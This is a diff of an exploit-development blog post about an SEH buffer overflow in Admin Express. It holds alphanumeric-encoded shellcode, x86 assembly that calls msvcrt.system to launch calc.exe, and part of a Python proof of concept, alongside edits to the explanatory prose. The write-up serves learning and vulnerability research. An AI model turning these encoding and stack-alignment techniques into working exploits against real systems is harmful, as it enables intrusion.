@@ -6,9 +6,9 @@ excerpt: "A 0day I found in an application called Admin Express, how to, by hand
 ---
 Introduction
 ---
-Get an internship in information security...? check! Obtain the OSCP ...? check! Discover a vulnerability and obtain code execution...? Oh, that is depressing. These are the first three goals I've set for myself, since I've had the inclination to obtain a career within information security. Reviewing the elusive last item on this checklist marred me with every second that passed. After months of probing the [Exploit Database](https://www.exploit-db.com) for some Denial of Service vulnerabilities, I am very happy to report that I have taken a crash of an application and revitalized it to obtain code execution! 
+After months of probing the [Exploit Database](https://www.exploit-db.com) for some Denial of Service vulnerabilities, I am very happy to report that I have taken a crash of an application and revitalized it to obtain code execution! 
 
-This blog post ___WILL BE LENGTHY___ and less about studious vernacular, but I hope there is some good information you can take away about what I learned about the following domains: alphanumeric shellcode, encoding shellcode, aligning the stack, assembler, hexadecimal math, Win32 API shellcode, and those famous SEH exploits. This writeup will assume you understand exception handler exploits. If you do not know much about those, or want a refresher, you can find my writeup [here](https://connormcgarr.github.io/Exception-Handlers-and-Egg-Hunters/). Let's get into it!
+This blog post ___WILL BE LENGTHY___ and less about studious vernacular, but I hope there is some good information you can take away about what I learned about the following domains: alphanumeric shellcode, aligning the stack, assembler, hexadecimal math, Win32 API Shellcode, and those famous SEH exploits. This writeup will assume you understand exception handler exploits. If you do not know much about those, or want a refresher, you can find my writeup [here](https://connormcgarr.github.io/Exception-Handlers-and-Egg-Hunters/). Let's get into it!
 
 The Crash
 ---
@@ -221,7 +221,7 @@ As you can see, we have reached the buffer of C's. Let's take note of some addre
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/14a.png" alt="">
 
-Take note of the current `ESP` value. Talking to a friend of mine about shellcode execution when shellcode is generated using the [Win32 API](https://docs.microsoft.com/en-us/windows/desktop/apiindex/windows-api-list), I found out that I needed to save the current stack point value __BEFORE__ I execute my shellcode. As you will see later, I will store my current `ESP` value into the `ECX` register and restore the old stack pointer right before execution of the shellcode.
+Take note of the current `ESP` value. For a reason I cannot explain (and outline later), I found out that I needed to save the current stack point value __BEFORE__ I execute my shellcode. As you will see later, I will store my current `ESP` value into the `ECX` register and restore the old stack pointer right before execution of the shellcode.
 
 Taking a look at our buffer of `C`'s, we have about __E4__ hex bytes, or __228__ bytes to work with:
 
@@ -489,7 +489,7 @@ Excellent! We have ended at the end of our buffer of `C`'s! To get this value al
 
 Perfect! Essentially now, we are in the driver's seat! What we can do now is we can manipulate `EAX` with whatever values we want, and they will write to lower memory addresses (visually up the stack), from where `ESP` is pointing to! Remembering this, we should start with our last piece of shellcode.
 
-We are lucky here that our shellcode has four lines with four bytes each. If we had shellcode with 17 bytes, for instance, we would have to add some [NOPs](https://en.wikipedia.org/wiki/NOP_(code)). Here is what our shellcode looks like:
+Explanation of why this shellcode is crafted the way it is, will come later. For now, realize that we are lucky here that our shellcode has four lines with four bytes each. If we had shellcode with 17 bytes, for instance, we would have to add some [NOPs](https://en.wikipedia.org/wiki/NOP_(code)). Here is what our shellcode looks like:
 
 ```console
 "\x31\xc9\x51\x68"
@@ -497,7 +497,6 @@ We are lucky here that our shellcode has four lines with four bytes each. If we 
 "\x54\xB8\xc7\x93"
 "\xc2\x77\xff\xd0"
 ```
-
 But what if our shellcode was this:
 
 ```console
@@ -596,6 +595,9 @@ push dword ptr esp
 mov eax,0x77c293c7        
 call eax  
 ```
+The register ECX is first reverted to a state of being "zero" in order for calculations to be made. Then, that null value is pushed onto the stack to terminate any string that may come before it. Then, the DWORD "calc" is pushed onto the stack. Whenever an item is pushed onto the stack, it will automatically reside in ESP.
+
+Calling ```msvcrt.system``` requires a pointer as an argument. Since we want to execute ```calc.exe```, we pushed the DWORD onto the stack. The ```push dword ptr esp``` pushes the pointer that references the application we want to execute. Then, the address of ```msvcrt.system``` is loaded into EAX. The function is then called, with a pointer to```calc``` as the argument for execution.
 
 Anyways, here is the updated PoC:
 
@@ -708,9 +710,7 @@ We step through the rest of the instructions. After doing that, you can scroll d
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/xor.png" alt="">
 
-Take Me Back
----
-Do not forget one final and __CRUCIAL__ instruction we are missing. I still cannot figure out exactly why, but when calling the Win32 API in Windows- it does not like the stack to be manipulated when this is taking place. This is the best rationale I can come up with after talking to multiple people about this issue. For this reason, restoring the old stack pointer will let us execute our shellcode. When I tried this without calling the old stack pointer, nothing worked. If anyone has any better information on this- PLEASE LET ME KNOW! My contact information is available on the [homepage](https://connormcgarr.github.io).
+I still cannot figure out exactly why, but if I did not restore the original stack pointer, the shellcode broke. The shellcode seems to need one instruction executed before the call to ```msvcrt.system``` occurs, in order for the application not to trip over itself. As conveluted as it may sound, this is the best rationale I can come up. If anyone has any better information on this- PLEASE LET ME KNOW! My contact information is available on the [homepage](https://connormcgarr.github.io).
 
 Recall from above that we saved the old stack pointer in `ECX`. We can use another subtraction method to do this. We will use a `MOV` instruction to move `ECX` into `ESP`. 
 
@@ -804,8 +804,8 @@ shellcode += "\x2d\x45\x12\x3a\x32" # sub eax, 0x323A1245
 shellcode += "\x2d\x45\x12\x3a\x33" # sub eax, 0x333A1245
 shellcode += "\x50" # push eax
 
-# We need to restore the old ESP value of 0x0012DC98 to spawn calc.exe. Since it is a call to the Win32 API,
-# we need the ESP value before execution. We will do this by performing MOV ECX, ESP (remember ECX contains old ESP!).
+# We need to restore the old ESP value of 0x0012DC98 to spawn calc.exe.
+# We need the ESP value before execution. We will do this by performing MOV ECX, ESP (remember ECX contains old ESP!).
 # Here are the 3 values: 403F2711 3F3F2711 3F3F2811
 move = zero
 move += "\x2d\x40\x3f\x27\x11" # sub eax, 0x403F2711
